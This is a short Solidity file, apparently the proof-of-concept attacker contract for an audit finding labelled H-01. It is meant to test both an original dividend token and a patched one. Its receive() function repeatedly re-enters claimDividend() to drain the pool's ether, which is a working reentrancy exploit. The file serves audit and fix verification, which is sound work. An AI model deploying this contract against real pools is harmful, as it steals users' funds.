// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IDividendPool {
    function claimDividend() external;
    function pendingDividend(address account) external view returns (uint256);
}

/// @notice Attacker contract for the H-01 PoC.
/// @dev Uses a small interface so the same attacker works against both the
///      original token and the patched one.
contract ReentrantClaimer {
    IDividendPool public immutable pool;
    uint256 public reentries;

    constructor(address _pool) {
        pool = IDividendPool(_pool);
    }

    function attack() external {
        pool.claimDividend();
    }

    receive() external payable {
        uint256 share = pool.pendingDividend(address(this));
        if (share > 0 && address(pool).balance >= share) {
            reentries++;
            pool.claimDividend();
        }
    }
}
